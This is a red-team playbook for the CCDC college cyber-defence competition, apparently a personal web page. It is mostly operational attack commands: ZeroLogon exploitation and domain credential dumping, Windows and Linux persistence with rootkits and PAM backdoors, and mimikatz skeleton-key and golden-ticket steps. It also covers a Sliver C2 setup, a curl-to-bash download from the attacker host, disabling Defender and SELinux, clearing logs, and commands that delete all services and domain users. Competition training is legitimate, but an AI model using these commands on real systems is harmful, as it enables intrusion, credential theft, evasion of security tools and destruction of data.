---
layout: blank
pagetitle: Red Teaming for CCDC
---

## Playbook

- Make sure to have a sheet with all host/shell info, so if we lose a shell we know where we lost it
- Before competition start, have kali already hosting a Linux implant/beacon, Windows implant/beacon, and our persistence scripts/binaries. 
- Opening Salvo:
  - Quickly nmap scan for port 445, as this will almost always be our gateway in
  - `sudo nmap -T4 -min-hostgroup 96 -p 53,445 --open {IP_range} | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > smb_ips.txt`
    - `-min-hostgroup` will divide the range up into 96 sup parts
    - Instead of `-T4`, we can specify `--max-retries 2 --max-rtt-timeout {double_time_to_ping}ms --min-rate 300`
  - Then, check SMB IPs with `while read -r line; do nxc smb $line -u '' -p '' -M zerologon -M printnightmare -M smbghost -M ms17-010; done < smb_ips.txt` 
    - [ZeroLogonShot](https://github.com/XiaoliChan/zerologon-Shot) will exploit and fix
      - `for i in {1..10}; do python3 zerologon-Shot.py {DC_name} {DC_IP_with_$i}; done`
    - If we get a zerologon hit, run `zerologon.py` and then `impacket-secretsdump -just-dc -no-pass {domain}/{machine_name}:@{DC_IP}`
      - `for i in {1..10}; do python3 zerologon.py {DC_name} {DC_IP_with_$i}; done`
      - e.g. `impacket-secretsdump -just-dc -no-pass 'corp.local/TEST-DC$@10.10.0.162'` (if DC name is TEST-DC)
  - Simultaneously run a scan for all port 22s (so we can use them when we find the default password)
    - `sudo nmap -sV -O -T4 -min-hostgroup 96 -p 22 {IP_range}`
  - Additionally, one final `sudo nmap -sn -T4 {IP_range} | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > ips.txt` to just figure out what hosts are online
    - Then pass alive hosts to autorecon with `sudo autorecon -t ips.txt -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,636,873,993,995,1025-1030,1080,1433,1521,1723,3306,3389,5432,5900,5985,6379,6667,8000,8080,8443,8888 -o autorecon_results --max-scans 100`

## Autorecon
- Overall status: `find autorecon_results -name "*.txt" -type f -exec grep -l "open" {} \; | sort`
- Common vulns: `grep -r "MS17-010\|CVE-\|Anonymous\|Password:" autorecon_results`
- Anonymous access: `grep -r "Anonymous" autorecon_results`
- Find DC: `grep -r "Domain Controller" autorecon_results`
- Passwords: `grep -r "Password:\|Credentials:" autorecon_results`
- Missing SMB signing: `grep -r "SMB signing required: false" autorecon_results`

## Machine Persistence

**Windows:**
- Todo
  - Write a persistence script that does the following 
    - (maybe) Creates an exclusion for ProgramData AND/OR disables defender
    - Downloads and executes [nosferatu](https://github.com/RITRedteam/nosferatu/)
      - Makes this a service that occurs on restart
    - Downloads sliver shell and creates a sliver service hidden with ACLs
    - Maybe use [https://www.nssm.cc/download](https://www.nssm.cc/download) for services?
  - Check out [RealBindingEDR](https://github.com/myzxcg/RealBlindingEDR)
  - Hide services with ACLs: [https://www.sans.org/blog/red-team-tactics-hiding-windows-services](https://www.sans.org/blog/red-team-tactics-hiding-windows-services)
    - `& $env:SystemRoot\System32\sc.exe sdset {name} "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"`
  - Pivoting with netsh port proxy
  - C2s
    - BOAZ: https://github.com/thomasxm/BOAZ_beta
    - ChromeAlone: https://github.com/praetorian-inc/ChromeAlone
    - HiddenDesktop: https://github.com/WKL-Sec/HiddenDesktop
    - Test out some payloads
  - Hidden RDP
    - Patching termsrv - https://freedium.cfd/https://samdecrock.medium.com/patching-microsofts-remote-desktop-service-yourself-db25a4d8bc64
      - This allows multiple users RDP as one user
    - Found a repo: https://github.com/f3di006/hRDP
  - DarkLnk - creates disguised .lnk files that run powershell but look like something else
    - https://github.com/wariv/Darklnk
- When installing the exes, make sure to use `-o` with `iwr` or we'll just get the HTTP connection info lmfao
- First, run [windows_add_payloads.ps1 -src {path_to_exe}](https://khaelkugler.com/scripts/windows_add_payloads.ps1.html) to add the file to each of the locations
- Then, run [windows_persistence.ps1](https://khaelkugler.com/scripts/windows_persistence.ps1.html)
  - Removing persistence:
    - Delete payloads from all locations
    - Schtask: `Unregister-ScheduledTask -TaskName "WindowsUpdater" -Confirm:$false`
    - Registry Run Key: Delete registry entries from both locations
    - Shortcut in Startup: `rm 'C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winupdater.lnk'`
    - Service: `Stop-Service -Name "WinUpdaterSvc"` and `$service = Get-WmiObject -Class Win32_Service -Filter "Name='WinUpdaterSvc'"; $service.delete()`
    - Registry UserInit: Remove 2nd path and 2nd comma from `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
    - Registry Logon Script: Remove path from `HKCU:\Environment`
- Persisting via the `Guest` account
  - After enabling/providing administrator to Guest and adding it to the `Remote Desktop Users` group, we might still need to configure group policy:
    - `secedit /export /cfg C:\Windows\temp\secpol.inf`
    - Modify the "SeDenyInteractiveLogonRight" line and remove the `Guest` account
    - Reimport with `secedit /configure /db C:\Windows\temp\secedit.sdb /cgf C:\Windows\temp\secpol.inf`
    - Then update GP with `gpupdate /force`

**Linux:**
- [PANIX](https://github.com/Aegrah/PANIX)
  - One-stop shop for lots of persistence methods, this thing is a great reference
- Todo:
  - Make malware that:
    - Makes it so you can only run a certain number of commands before being logged out
    - Makes it so you have to solve a times-table equation to see the result of your command
  - Get something going for alpine/Nixos
    - Alpine
      - Add a second location for SSH keys 
    - Nixos
      - Get gcc with `nix-shell -p libgcc pam`
      - Figure out which PAM file controls auth and modify it
- Scripting across teams
  - Running commands with SSH by putting it after the command
    - `echo "{password}" | sshpass -p "{password}" ssh -o StrictHostKeyChecking=no "{username}@{ip}" "sudo -S id"`
      - This will work regardless of whether the password is actually required
    - `echo "{password}" | sshpass -p "{password}" ssh -o StrictHostKeyChecking=no "{username}@{ip}" "sudo -S bash -c 'curl -L {kali_IP}:{port}/p.sh | bash -s {kali_IP}:{port}'"`
      - Can use `authfinder`
        - `authfinder {ips} -u {user} -p {pass} -c '{command}' --linux `
          - If we need to sudo: `authfinder {ips} -u {user} -p {pass} -c 'echo {pass} | sudo -S bash -c "{commands}"' --linux -o`
      - `for i in {1..10}; do echo $i; done`
- [Singularity](https://github.com/MatheuZSecurity/Singularity)
  - Holy balls what a nice rootkit
    - Supports hiding multiple names, has privesc, ICMP backdoor, hiding services
      - Root with `MAGIC=mtz bash` or simply `kill -59 $$`
      - Hide port by editing `modules/hiding_tcp.c` and adding a port to `is_hidden_port`
      - Hide files containing `singularity` (or any name within `include/hiding_directory_def.h`)
      - Hide process with `kill -59 <PID>`
      - ICMP shell:
        - Start listener on `8081`
        - Then run `sudo python3 scripts/trigger.py {IP}` and wait for shell
- [Reptile](https://web.archive.org/web/20250703011339/https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.zip)
  - Absolutely nutty rootkit for 2.6.x, 3.x, or 4.x, seems to be the go-to
    - Has persistent, detection evasion, a nice management interface
  - Downloadable [here](https://web.archive.org/web/20240220194314/https://codeload.github.com/f0rb1dd3n/Reptile/zip/refs/heads/master)
  - Wiki [here](https://web.archive.org/web/20201226000229/https://github.com/f0rb1dd3n/Reptile/wiki/Install)
  - Config:
    - In `config/defconfig`, then after configuring we run `make defconfig`
  - Install:
    - `apt install build-essential linux-headers-$(uname -r)`
    - `make menuconfig`, `make`, and `make install`
  - Bugs:
    - Reptile will hide more stuff than necessary in affected directories
      - Fixed by changing kernel main.c to use `if (strstr(name->name, HIDE) && hidden) {return NULL;}` instead of existing logic
    - Couldn't get kali-side build working, so we can use prism for the shell
  - Usage:
    - `/reptile/reptile_cmd {show/hide}` to show/hide all hidden files
    - `/reptile/reptile_cmd root` to get root
    - `/reptile/reptile_cmd {show/hide} {pid}` to show/hide processes
    - `/reptile/reptile_cmd conn {IP} {show/hide}` to show/hide ICP/UDP connections
    - Content between `#<reptile>` and `#</reptile>` will be hidden
      - Can be toggled with `reptile_cmd file-tampering`
      - Works with both adding users to `/etc/passwd` and cron jobs
        - Actually, having some trouble getting it working with cron jobs
      - However, ssh seems resistant. Can't seem to permit root logins with a hidden line or add an hidden authorized keys file
- Current persistence: 
  - Universal SSH key added
    - `ssh root@ip -i id_ed25519`
  - Pam backdoor (disabled for now)
    - `ssh user@ip` with `NewPass123`
    - `cat /opt/dhcpcnf/pam_out`
  - Watershell
    - `python3 watershell-cli.py -t ip -p 53 -c id`
    - Run on all: `python3 broadcast.py -p 53 'id'`
  - Triggerable: `/opt/dhcpcnf/trigger.sh`
    - Drops firewall, re-adds universal SSH key, opens 58348
    - ``socat FILE:`tty`,raw,echo=0 TCP:ip:58348``
  - SUID binaries:
    - `/usr/lib/openssh/ssh-keygen -p`
    - `ip netns add foo; ip netns exec foo /bin/sh -p`
    - `chroot / /bin/sh -p`

## Domain Persistence

**Passwords Shenanigans**
- Allow reversible encryption for all users: `Get-ADUser -Filter { SamAccountName -notlike "*$" } | Set-ADUser -AllowReversiblePasswordEncryption $true`
- Turn on reversible encryption policy: `Set-ADDefaultDomainPasswordPolicy -Identity (Get-ADDomain).DistinguishedName -ReversibleEncryptionEnabled $true`
- Force NTLMv1: `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LMCompatibilityLevel" -Value 0 -Type DWord`
- Allow old passwords for 5 days: `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "OldPasswordAllowedPeriod" -Value 7200 -Type DWord`
- Make password policy terrible: `Set-ADDefaultDomainPasswordPolicy -Identity (Get-ADDomain).DistinguishedName -MinPasswordLength 1 -PasswordHistoryCount 0 -ComplexityEnabled $false -MaxPasswordAge "999.00:00:00" -MinPasswordAge "0.00:00:00" -LockoutThreshold 0`
- Store plaintext password with WDigest: `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1 -Type DWord`
- Allow DSRM account logon at all times: `Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2`
  - This makes the DC accept the local SAM hash for the Administrator user, just specify user as `{DC_name}/User`

**Make Services Worse**
- Disable SMB Signing: `Set-SmbServerConfiguration -RequireSecuritySignature $false -EnableSecuritySignature $false -Force`

**Logging**
- Disable audit policies: `auditpol /set /category:* /success:disable /failure:disable`
- Clear existing logs: `wevtutil cl Security; wevtutil cl System; wevtutil cl Application`

**Skeleton Key**
- Implants into LSASS and creates master password working for any AD account
- `mimikatz "privilege::debug" "misc::skeleton" "exit"` - adds `mimikatz` as a password to all users
- Can use or mess around with [https://github.com/RITRedteam/nosferatu/](https://github.com/RITRedteam/nosferatu/) 

**MemSSP**
- Injects a new Security Support Provider into LSASS
- `mimikatz "privilege::debug" "misc::memssp" "exit"`
  - Can follow this up with `misc::lock /process:explorer.exe` to LOG OUT active users!!
- After each authentication, password is stored in `C:\Windows\System32\mimilsa.log` or `C:\Windows\System32\kiwissp.log`

**Golden Certificate**
- Performed with:
  - `certipy ca -backup -ca '{certificate_name}' -username {user}@{domain} -hashes {hash}`
  - `certipy forge -ca-pfx {ca_private_key} -upn {user}@{domain} -subject 'CN={user},CN=Users,DC={domain},DC={tld}`

**Golden Ticket**
- Trying to get the KDC's secret key to create self-made tickets for any service on the system
- Requires full control over the DC or a being part of a Domain Admin group
- Dump `krbtgt` NTLM hash with mimikatz (unless we already have it)
	- `lsadump::lsa /patch`
- After grabbing the hash:
  - `ticketer.py -duration 10 -aesKey "{aes_key}" -domain-sid "{domain_sid}" -domain "{domain_name}" "Administrator"`
		- The `domain_SID` can be gathered from whoami /user
- This will essentially give the domain user Domain Admin privileges
	- `impacket-psexec -k -no-pass Administrator@{DC_fqdn}`
	- Make sure we can resolve both the domain AND the DC itself

**Adding a new Computer Account**
- Might be overlooked during normal user password rotations
- `New-ADComputer -Name {PC_NAME_NO_$} -AccountPassword (ConvertTo-SecureString '{new_pass}' -AsPlainText -Force) -Enabled $true`
  - If on linux: `addcomputer.py -computer-name 'KRBTGT$' -computer-pass '{new_password}' -dc-host "{dc_ip}" -domain-netbios '{domain}' '{domain}'/'{owned_user}':'{owner_user_pass}'`
- Then give it permissions over the domain (so we can secretsdump)
  - `dsacls 'DC={domain},DC={tld}' /I:T /G '{domain}\{machine_account}:CA;Replicating Directory Changes'`
  - `dsacls 'DC={domain},DC={tld}' /I:T /G '{domain}\{machine_account}:CA;Replicating Directory Changes All'`
- Should also give it `SeBackupPrivilege` and `SeRestorePrivilege` 
  - Will need remoting privileges, so add to `remote management users` with `net localgroup 'remote management users' /add {machine_account}`
  - Can use [this handy script](https://github.com/blakedrumm/SCOM-Scripts-and-SQL/blob/master/Powershell/General%20Functions/Set-UserRights.ps1)
    - `.\Set-UserRights.ps1 -AddRight -Username {domain}\{machine_account} -UserRight SeBackupPrivilege,SeRestorePrivilege`
		
**Shadow Copies**
- Volume Shadow Service is a Microsoft backup technology that allows creation of snapshots
- As a domain admin, we can create a shadow copy and extract the NTDS.dit database file
- Installed from [here](https://www.microsoft.com/en-us/download/details.aspx?id=23490)
- Run `vshadow.exe -nw -p C:`
- Then copy the Database from the shadow copy to the C: folder
	- `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
- Then, save the SYSTEM hive with `reg.exe save hklm\system c:\system.bak`
- We can now access all NTLM hashes and Kerberos keys using `impacket-secretsdump`
	- `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`

## Sliver
- Can build from source with `sudo apt install golang-go`, `curl https://sliver.sh/install | sudo bash`, and `cd sliver && make`
- To make sure we don't kill the mf server, let's operate from a client
  - Start up tmux and run `sliver-server`
  - On the server: `new-operator --name {op_name} --lhost localhost` and `multiplayer` to enable clients
  - On the client, outside of tmux: `sliver-client import {config_file}` and `sliver-client` to join
- `wg` can be used to start listening for incoming sessions on a sneaky wireguard udp (use mtls otherwise if we dont get a callback)
  - **IMPORTANT!!** `evil-winrm` implants and beacons (and sometimes maybe `wmi-exec`?) will DIE a HORRIBLE DEATH, use another method to run the implant/beacon
- Then, use `generate` to create implants or beacons
  - `generate --wg {our_IP} --os linux` for an implant
  - `generate beacon --wg 192.168.0.102 -j {jitter} -S {wait_seconds} --os linux` 
  - Windows: `generate --mtls 192.168.0.102 --os windows` 
  - If we need to pivot, use `--tcp-pivot {IP}` and then we can see our pivots with `pivots tcp`
- `sessions` to show active sessions
  - `sessions -i {id}` to interact with session
    - `CTRL + d` to exit
    - `shell {command}` will execute command in a session (can maybe run without `shell`?)
    - `getprivs` will list privileges available, probably use /ProgramData/ for potatoes?
    - `info` - host info
    - `ps` - process list
    - `upload`/`download` - file transfer
    - `screenshot` - grab a screenshot
- `beacons` to show active beacons
  - `use {beacon_id}` to use a beacon
    - `interactive` to turn it into a normal session
- Armory:
  - Install all with `armory install all`
  - Sharphound: `sharp-hound-4 -- '-c all,GPOLocalGroup'`

## Messing with Blue Team

**Trolling on Linux**
- Make `apt` useless:
  - `sed -i '50i alias apt="apt -s"' /root/.bashrc; touch -d "Aug 8 2023" /root/.bashrc; sed -i '50i alias apt="apt -s"' /root/.zshrc; touch -d "Aug 8 2023" /root/.zshrc`
- Wall on linux:
  - `wall "dance"`
- Set language to german: `echo "loadkeys de && localectl set-locale de_DE.UTF-8 && localectl set-keymap de" >> ~/.bashrc`
- Firewall
  - Iptables: `iptables -A INPUT -p tcp --dport 80 -j drop` 
  - NFT: `nft add rule inet filter input tcp dport 80 drop`
  - UFW: `ufw deny 80/tcp`
- `who` to see who's on a system
  - `pkill -t {result}` to then kill their session
    - `pkill -KILL -u {user}` - kill all of a user's processes
  - `kill -9 {pid}` to kill a specific process
  
**Trolling on Windows**
- Set everything to German: `Install-Language -Language de-DE -CopyToSettings; Set-WinUserLanguageList de-DE -Force; Set-WinSystemLocale -SystemLocale de-DE; Set-WinUILanguageOverride -Language de-DE; Set-Culture de-DE; Set-WinHomeLocation -GeoId 94`
- `misc::wp /file:{path}` to set the current PC's wallpaper
- `sc.exe stop dns` to stop dns
  - `sc.exe delete dns` to delete it
  - Delete all services lol: `powershell -c "Get-Service | ForEach-Object { sc.exe stop $_.Name; sc.exe delete $_.Name }"`
- Delete IP on interface: `netsh interface ip delete address "Ethernet" addr={address}`
- `powershell -c "Get-ADUser -Filter * | ForEach-Object { Remove-ADUser $_ -Confirm:$false }"` to delete domain users
- Set all computers to same background: `Function Set-WallPaper($i){Add-Type '[DllImport("user32.dll",CharSet=CharSet.Unicode)]public static extern int SystemParametersInfo(int a,int b,string c,int d);' -Name U -Namespace W;[W.U]::SystemParametersInfo(20,0,$i,3)}; iwr https://pbs.twimg.com/profile_images/1308769664240160770/AfgzWVE7_400x400.jpg -o C:\ProgramData\joe.jpg; Set-WallPaper "C:\ProgramData\joe.jpg"`
- Make mouse shake: [cold_hands.exe](https://khaelkugler.com/misc_scripts/cold_hands.exe)
  - Script to make it happen and add to HKLM -> Run
  - `iwr https://khaelkugler.com/misc_scripts/cold_hands.exe -o "C:\Program Files (x86)\Microsoft\Edge\Application\joe_biden.exe"; Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "ChillyFingers" -Value "C:\Program Files (x86)\Microsoft\Edge\Application\joe_biden.exe"; iwr https://download.sysinternals.com/files/PSTools.zip -o "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools.zip"; Expand-Archive "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools.zip" -d "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools\"; 1..5 | ForEach-Object { & "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools\psexec.exe" -i $_ -d -s "C:\Program Files (x86)\Microsoft\Edge\Application\joe_biden.exe" -accepteula }`
- In another user's session with `.\psexec -i {session} -d -s powershell -command '{command}' -accepteula`
  - `-d` exits immediately 
- Spawn 50 notepads:
  - `1..50 | ForEach-Object {Start-Process notepad}`
- Spawn message box on Windows:
  - `Add-Type -AssemblyName PresentationFramework;   [System.Windows.MessageBox]::Show("{message_box_message}", "{message_box_title}", 0, 64)`
- Firewall stuff
  - Simplewall hopper: `https://github.com/ECWRCCDC/swh/blob/main/Payload/source/swh.c`
  - Turn off firewall: `Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False`
    - Reset firewall to default rules (this can break stuff): `netsh advfirewall reset`
    - NUKE firewall (will prevent remote access): `Remove-NetFirewallRule -All` 
  - Firewall a service: `New-NetFirewallRule -DisplayName "adb.exe" -Direction Inbound -Protocol TCP -LocalPort 80 -Action Block`
- See who's got an RDP session: `query user` or `query session`
  - Hijack it with `tscon.exe {target_id} /dest:rdp-tcp#{our_rdp_session_number}`
- Logoff user: `query session` and `logoff {id}` to log off a specific user

## Dealing with System Protections

**Defender**
- If we're local admin, we can just add an exclusion:
  - `Add-MpPreference -ExclusionPath "{path_to_excluded_folder}"`
- We can spoof another antivirus with DefendNot
  - `& ([ScriptBlock]::Create((irm https://dnot.sh/))) --name "{custom_AV_name}"`
    - We'll need an exclusion on `C:\` first (technically `\Users` and `\Program Files`)
- Permanently disable with:
  - `reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`
  - `gpedit.msc` > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Turn off Microsoft Defender Antivirus > Enabled
  - Just run all of these in powershell and defender should be lobotomized by the end:
    - `'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All`
    - `Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -MAPSReporting 0 -SubmitSamplesConsent 2`
      - This needs to be run before restarting (and in doing so disabling modifications of defender)
    - `Remove-WindowsFeature Windows-Defender`
    - `Stop-Service WinDefend -Force`
    - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force`
    - `Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" -Name "AllowAntivirus" -Value 0 -Type DWord`
    - Then reboot
- Bypassing with FilelessPELoader:
  - `https://github.com/SaadAhla/FilelessPELoader`

**Getting Firewalled**
- Use something like [Sangheili](github.com/RITRedteam/Sangheili) to rotate through hundreds of IPs

**CS Falcon**
- Seems `wmiexec` with `-silentcommand` and `-nooutput` seems to work with CS Falcon enabled

**AppArmor**
- `sudo systemctl stop apparmor`, `sudo systemctl disable apparmor`, `sudo apt purge apparmor`

**SELinux**
- Status with `sestatus`
- Temp disable: `sudo setenforce 0` or `sudo setenforce permissive`
- Permanent disable: set `SELINUX=enforcing` to `disabled` in `/etc/selinux/config` and reboot

